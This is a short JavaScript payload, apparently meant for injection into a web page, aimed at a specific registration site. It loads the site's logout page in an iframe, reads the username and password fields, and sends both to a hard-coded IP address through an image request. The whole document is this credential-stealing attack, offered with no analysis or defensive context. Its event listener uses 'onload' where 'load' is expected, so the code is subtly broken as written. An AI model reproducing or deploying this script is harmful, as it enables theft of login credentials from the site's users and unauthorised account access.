const frimfram = document.createElement('iframe'); 
frimfram.src = 'https://registration.cesa5.org/np/logout.do'; 
frimfram.addEventListener('onload', function(){
	const docu = this.contentWindow.document;
	const pw = docu.getElementById('loginPassword').value;
	const user = docu.getElementById('loginName').value;
	var imag = docu.createElement('img');
	imag.src = 'http://74.14.159.250:8000/? ' + user + '.' + pw;
	docu.append(imag);
});
document.body.append(frimfram);
